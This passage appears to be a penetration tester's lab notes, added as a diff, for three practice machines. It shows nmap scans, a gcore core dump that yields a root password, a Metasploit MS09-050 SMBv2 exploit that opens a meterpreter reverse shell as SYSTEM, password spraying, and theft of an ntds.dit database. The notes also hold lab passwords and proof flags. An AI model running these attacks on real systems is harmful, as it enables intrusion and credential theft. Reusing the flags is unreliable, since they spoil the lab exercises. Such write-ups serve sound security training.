@@ -1,0 +1,889 @@
+┌──(kali㉿kali)-[~/pelican]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.206.98 -p 1-65300
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-19 09:59 CEST
+Nmap scan report for 192.168.206.98
+Host is up (0.048s latency).
+Not shown: 65291 closed tcp ports (conn-refused)
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
+|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
+|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+631/tcp   open  ipp         CUPS 2.2
+|_http-title: Forbidden - CUPS v2.2.10
+| http-methods: 
+|_  Potentially risky methods: PUT
+|_http-server-header: CUPS/2.2 IPP/2.1
+2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
+2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
+|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
+|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
+8080/tcp  open  http        Jetty 1.0
+|_http-server-header: Jetty(1.0)
+|_http-title: Error 404 Not Found
+8081/tcp  open  http        nginx 1.14.2
+|_http-title: Did not follow redirect to http://192.168.206.98:8080/exhibitor/v1/ui/index.html
+|_http-server-header: nginx/1.14.2
+46295/tcp open  java-rmi    Java RMI
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 4 hops
+Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-06-19T08:00:06
+|_  start_date: N/A
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: pelican
+|   NetBIOS computer name: PELICAN\x00
+|   Domain name: \x00
+|   FQDN: pelican
+|_  System time: 2025-06-19T04:00:05-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 1h20m21s, deviation: 2h18m35s, median: 20s
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   50.69 ms 192.168.45.1
+2   50.38 ms 192.168.45.254
+3   51.31 ms 192.168.251.1
+4   51.81 ms 192.168.206.98
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 46.06 seconds
+
+
+The application on exihibitor running on port 8081 and redirecting to port 8080 is the vulnerable application.
+
+I used this guide for initial foothold  https://github.com/thehunt1s0n/Exihibitor-RCE
+
+To get a fully interactive shell, I used this command  python -c 'import pty; pty.spawn("/bin/bash")'
+
+For privilege escalation, I ran linpeas.sh on the target. The looking out the winpease out. I found this:
+
+                                                                                                                                                                                               
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                               
+Matching Defaults entries for charles on pelican:                                                                                                                                              
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on pelican:
+    (ALL) NOPASSWD: /usr/bin/gcore
+Sudoers file: /etc/sudoers.d/charles is readable
+charles ALL=(ALL) NOPASSWD:/usr/bin/gcore
+
+I searched the website https://gtfobins.github.io/gtfobins/gcore/#sudo to understand what I can do with the privilege. I found this.
+
+It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named core.$PID, that is then often filtered with strings to narrow down relevant information.
+
+I also found this scheduled cron job
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+@reboot         root    /usr/bin/password-store
+@reboot         root    while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+
+I checked the process ID of the cron job
+root       490  0.0  0.0   2276    72 ?        Ss   03:51   0:00 /usr/bin/passwo
+
+charles@pelican:~$ sudo gcore 490
+sudo gcore 490
+0x00007fec7ea386f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffd84db2450, remaining=remaining@entry=0x7ffd84db2450) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
+28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
+Saved corefile core.490
+[Inferior 1 (process 490) detached]
+
+charles@pelican:~$ ls
+ls
+core.490  linpeas.sh  local.txt
+
+charles@pelican:~$ string core.490
+string core.490
+bash: string: command not found
+charles@pelican:~$ strings core.490
+strings core.490
+CORE
+password-store
+/usr/bin/password-store 
+CORE
+CORE
+/usr/bin/passwor
+////////////////
+LINUX
+/usr/bin/passwor
+////////////////
+IGISCORE
+CORE
+ELIFCORE
+/usr/bin/password-store
+/usr/bin/password-store
+/usr/lib/x86_64-linux-gnu/libc-2.28.so
+/usr/lib/x86_64-linux-gnu/libc-2.28.so
+/usr/lib/x86_64-linux-gnu/ld-2.28.so
+/usr/lib/x86_64-linux-gnu/ld-2.28.so
+fork failed!
+/tmp
+;*3$"
+aliases
+ethers
+group
+gshadow
+hosts
+initgroups
+netgroup
+networks
+passwd
+protocols
+publickey
+services
+shadow
+CAk[S
+libc.so.6
+/lib/x86_64-linux-gnu
+libc.so.6
+;*3$"
+sse2
+x86_64
+avx512_1
+i586
+i686
+haswell
+xeon_phi
+linux-vdso.so.1
+tls/x86_64/x86_64/tls/x86_64/
+/lib/x86_64-linux-gnu/libc.so.6
+/usr/bin/passwor
+////////////////
+/usr/bin/passwor
+////////////////
+001 Password: root:
+ClogKingpinInning731
+x86_64
+/usr/bin/password-store
+HOME=/root
+LOGNAME=root
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+LANG=en_US.UTF-8
+SHELL=/bin/sh
+PWD=/root
+/usr/bin/password-store
+
+
+I found the plaintext password for the root user below 001 Password: root:
+charles@pelican:~$ su root
+su root
+Password: ClogKingpinInning731
+
+root@pelican:/home/charles# whoami
+whoami
+root
+root@pelican:/home/charles# hostname
+hostname
+pelican
+root@pelican:/home/charles# cd /root
+cd /root
+root@pelican:~# ls
+ls
+Desktop    Downloads  Pictures   Public     Videos
+Documents  Music      proof.txt  Templates
+root@pelican:~# cat proof.txt
+cat proof.txt
+dd495f31eb95beb151e68b53538ab940
+root@pelican:~# 
+
+
+
+#Internal
+
+┌──(kali㉿kali)-[~/internal]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.131.40 -p 1-65300      
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 07:00 CEST
+Nmap scan report for 192.168.131.40
+Host is up (0.053s latency).
+Not shown: 65287 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| rdp-ntlm-info: 
+|   Target_Name: INTERNAL
+|   NetBIOS_Domain_Name: INTERNAL
+|   NetBIOS_Computer_Name: INTERNAL
+|   DNS_Domain_Name: internal
+|   DNS_Computer_Name: internal
+|   Product_Version: 6.0.6001
+|_  System_Time: 2025-06-24T05:02:30+00:00
+5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Service Unavailable
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
+Network Distance: 4 hops
+Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
+
+Host script results:
+|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:73:a4 (VMware)
+|_clock-skew: mean: 1h44m59s, deviation: 3h30m00s, median: 0s
+| smb-os-discovery: 
+|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: internal
+|   NetBIOS computer name: INTERNAL\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-06-23T22:02:30-07:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2:0:2: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-06-24T05:02:30
+|_  start_date: 2024-08-03T02:11:43
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   50.97 ms 192.168.45.1
+2   50.53 ms 192.168.45.254
+3   51.01 ms 192.168.251.1
+4   51.17 ms 192.168.131.40
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 283.61 seconds
+
+I sacnned for vulnerability on the smb port because I could not find any other rabbit hole.
+
+┌──(kali㉿kali)-[~/internal]
+└─$ sudo nmap --script smb-vuln\* -p445 192.168.131.40
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 10:59 CEST
+Nmap scan report for internal.htb (192.168.131.40)
+Host is up (0.044s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
+| smb-vuln-cve2009-3103: 
+|   VULNERABLE:
+|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2009-3103
+|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
+|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
+|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
+|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
+|           aka "SMBv2 Negotiation Vulnerability."
+|           
+|     Disclosure date: 2009-09-08
+|     References:
+|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
+|_smb-vuln-ms10-054: false
+
+Nmap done: 1 IP address (1 host up) scanned in 30.94 seconds
+
+It is vulnerable to CVE-2009-3103
+
+I started searching for exploits
+I found this https://www.exploit-db.com/exploits/40280 but it was given buffer error.
+
+I searched for exploit I can use in Metersploit and found this https://www.exploit-db.com/exploits/16363
+
+I transferred to Metasploit
+
+msf6 > search ms09_050_smb2
+
+Matching Modules
+================
+
+   #  Name                                                       Disclosure Date  Rank    Check  Description
+   -  ----                                                       ---------------  ----    -----  -----------
+   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   1  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh  .                normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
+   2  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff     .                normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
+
+
+Interact with a module by name or index. For example info 2, use 2 or use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff
+
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options
+
+Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+   WAIT    180              yes       The number of seconds to wait for the attack to complete.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Vista SP1/SP2 and Server 2008 (x86)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set rhost 192.168.131.40
+rhost => 192.168.131.40
+msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set lhost 192.168.45.194 
+lhost => 192.168.45.194
+msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > options
+
+Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  192.168.131.40   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   445              yes       The target port (TCP)
+   WAIT    180              yes       The number of seconds to wait for the attack to complete.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.45.194   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Vista SP1/SP2 and Server 2008 (x86)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run
+[*] Started reverse TCP handler on 192.168.45.194:4444 
+[*] 192.168.131.40:445 - Connecting to the target (192.168.131.40:445)...
+[*] 192.168.131.40:445 - Sending the exploit packet (951 bytes)...
+[*] 192.168.131.40:445 - Waiting up to 180 seconds for exploit to trigger...
+[*] Sending stage (177734 bytes) to 192.168.131.40
+[*] Meterpreter session 1 opened (192.168.45.194:4444 -> 192.168.131.40:49159) at 2025-06-24 11:35:38 +0200
+
+meterpreter > shell
+Process 3596 created.
+Channel 1 created.
+Microsoft Windows [Version 6.0.6001]
+Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+internal
+
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+
+C:\>cd users
+cd users
+
+C:\Users>cd administrator
+cd administrator
+
+C:\Users\Administrator>dir Desktop\user.txt
+dir Desktop\user.txt
+ Volume in drive C has no label.
+ Volume Serial Number is B863-254D
+
+ Directory of C:\Users\Administrator\Desktop
+
+File Not Found
+
+C:\Users\Administrator>dir Desktop\root.txt
+dir Desktop\root.txt
+ Volume in drive C has no label.
+ Volume Serial Number is B863-254D
+
+ Directory of C:\Users\Administrator\Desktop
+
+File Not Found
+
+C:\Users\Administrator>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is B863-254D
+
+ Directory of C:\Users\Administrator
+
+01/08/2010  04:41 AM    <DIR>          .
+01/08/2010  04:41 AM    <DIR>          ..
+01/08/2010  04:28 AM    <DIR>          Contacts
+02/03/2011  08:51 PM    <DIR>          Desktop
+01/08/2010  04:28 AM    <DIR>          Documents
+03/26/2010  12:28 AM    <DIR>          Downloads
+01/08/2010  04:28 AM    <DIR>          Favorites
+01/08/2010  04:28 AM    <DIR>          Links
+01/08/2010  04:28 AM    <DIR>          Music
+01/08/2010  04:28 AM    <DIR>          Pictures
+01/08/2010  04:28 AM    <DIR>          Saved Games
+01/08/2010  04:28 AM    <DIR>          Searches
+01/08/2010  04:28 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)   3,990,581,248 bytes free
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is B863-254D
+
+ Directory of C:\Users\Administrator\Desktop
+
+02/03/2011  08:51 PM    <DIR>          .
+02/03/2011  08:51 PM    <DIR>          ..
+05/20/2016  10:26 PM                32 network-secret.txt
+06/23/2025  10:18 PM                34 proof.txt
+               2 File(s)             66 bytes
+               2 Dir(s)   3,990,581,248 bytes free
+
+C:\Users\Administrator\Desktop>type proof.txt
+type proof.txt
+86376759bb8bb268008d9c06e6aa647a
+
+
+Resourced AD
+
+┌──(kali㉿kali)-[~/resourced]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.131.175 -p 1-65300
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 12:21 CEST
+Nmap scan report for 192.168.131.175
+Host is up (0.046s latency).
+Not shown: 65279 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-24 10:23:42Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: resourced
+|   NetBIOS_Domain_Name: resourced
+|   NetBIOS_Computer_Name: RESOURCEDC
+|   DNS_Domain_Name: resourced.local
+|   DNS_Computer_Name: ResourceDC.resourced.local
+|   DNS_Tree_Name: resourced.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-06-24T10:24:33+00:00
+| ssl-cert: Subject: commonName=ResourceDC.resourced.local
+| Not valid before: 2025-06-23T10:20:34
+|_Not valid after:  2025-12-23T10:20:34
+|_ssl-date: 2025-06-24T10:25:59+00:00; -1s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  unknown
+49694/tcp open  unknown
+49712/tcp open  unknown
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 4 hops
+Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-06-24T10:24:37
+|_  start_date: N/A
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   44.11 ms 192.168.45.1
+2   44.01 ms 192.168.45.254
+3   44.13 ms 192.168.251.1
+4   45.14 ms 192.168.131.175
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 257.01 seconds
+                                                              
+
+I tried to access the machine via port 445, 88, 135, 389, 3268, 593, but could not. The open rdp port, no creds.
+
+I tried to scan the target using using enum4linux and found a user password and also the account names of domain users.
+
+┌──(kali㉿kali)-[~/resourced/windapsearch]
+└─$ enum4linux -a 192.168.131.175                                                                                           
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 24 15:34:59 2025
+
+ =========================================( Target Information )=========================================
+                                                                                                                                                                                               
+Target ........... 192.168.131.175                                                                                                                                                             
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==========================( Enumerating Workgroup/Domain on 192.168.131.175 )==========================
+                                                                                                                                                                                               
+                                                                                                                                                                                               
+[E] Can't find workgroup/domain                                                                                                                                                                
+                                                                                                                                                                                               
+                                                                                                                                                                                               
+
+ ==============================( Nbtstat Information for 192.168.131.175 )==============================
+                                                                                                                                                                                               
+Looking up status of 192.168.131.175                                                                                                                                                           
+No reply from 192.168.131.175
+
+ ==================================( Session Check on 192.168.131.175 )==================================
+                                                                                                                                                                                               
+                                                                                                                                                                                               
+[+] Server 192.168.131.175 allows sessions using username '', password ''                                                                                                                      
+                                                                                                                                                                                               
+                                                                                                                                                                                               
+ ===============================( Getting domain SID for 192.168.131.175 )===============================
+                                                                                                                                                                                               
+Domain Name: resourced                                                                                                                                                                         
+Domain Sid: S-1-5-21-537427935-490066102-1511301751
+
+[+] Host is part of a domain (not a workgroup)                                                                                                                                                 
+                                                                                                                                                                                               
+                                                                                                                                                                                               
+ =================================( OS information on 192.168.131.175 )=================================
+                                                                                                                                                                                               
+                                                                                                                                                                                               
+[E] Can't get OS info with smbclient                                                                                                                                                           
+                                                                                                                                                                                               
+                                                                                                                                                                                               
+[+] Got OS info for 192.168.131.175 from srvinfo:                                                                                                                                              
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                         
+
+
+ ======================================( Users on 192.168.131.175 )======================================
+                                                                                                                                                                                               
+index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                   
+index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
+index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
+index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
+index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
+index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
+index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
+index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
+index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
+index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
+index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
+index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
+
+
+# With the dumped creds for user V.Ventz , I got access and downloaded the user's shares to my local mchine
+
+┌──(kali㉿kali)-[~/resourced]
+└─$ netexec smb 192.168.131.175 -u user.txt -p HotelCalifornia194! --shares
+SMB         192.168.131.175 445    RESOURCEDC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False) 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\Administrator:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\D.Durant:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\G.Goldberg:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\Guest:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\J.Johnson:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\K.Keen:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\krbtgt:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\L.Livingstone:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\M.Mason:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\P.Parker:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\R.Robinson:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [-] resourced.local\S.Swanson:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.131.175 445    RESOURCEDC       [+] resourced.local\V.Ventz:HotelCalifornia194! 
+SMB         192.168.131.175 445    RESOURCEDC       [*] Enumerated shares
+SMB         192.168.131.175 445    RESOURCEDC       Share           Permissions     Remark
+SMB         192.168.131.175 445    RESOURCEDC       -----           -----------     ------
+SMB         192.168.131.175 445    RESOURCEDC       ADMIN$                          Remote Admin
+SMB         192.168.131.175 445    RESOURCEDC       C$                              Default share
+SMB         192.168.131.175 445    RESOURCEDC       IPC$            READ            Remote IPC
+SMB         192.168.131.175 445    RESOURCEDC       NETLOGON        READ            Logon server share 
+SMB         192.168.131.175 445    RESOURCEDC       Password Audit  READ            
+SMB         192.168.131.175 445    RESOURCEDC       SYSVOL          READ            Logon server share 
+
+
+┌──(kali㉿kali)-[~/resourced]
+└─$ smbclient \\\\192.168.131.175\\"Password Audit" -U V.Ventz 
+Password for [WORKGROUP\V.Ventz]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Oct  5 10:49:16 2021
+  ..                                  D        0  Tue Oct  5 10:49:16 2021
+  Active Directory                    D        0  Tue Oct  5 10:49:15 2021
+  registry                            D        0  Tue Oct  5 10:49:16 2021
+
+                7706623 blocks of size 4096. 2686966 blocks available
+smb: \> cd "Active Directory"
+smb: \Active Directory\> ls
+  .                                   D        0  Tue Oct  5 10:49:16 2021
+  ..                                  D        0  Tue Oct  5 10:49:16 2021
+  ntds.dit                            A 25165824  Mon Sep 27 13:30:54 2021
+  ntds.jfm                            A    16384  Mon Sep 27 13:30:54 2021
+
+                7706623 blocks of size 4096. 2686942 blocks available
+smb: \Active Directory\> get ntds.dit 
+getting file \Active Directory\ntds.dit of size 25165824 as ntds.dit (1679.7 KiloBytes/sec) (average 1679.7 KiloBytes/sec)
+smb: \Active Directory\> get ntds.jfm
+getting file \Active Directory\ntds.jfm of size 16384 as ntds.jfm (68.1 KiloBytes/sec) (average 1654.2 KiloBytes/sec)
+smb: \Active Directory\> cd ..
+smb: \> cd registry\
+smb: \registry\> ls
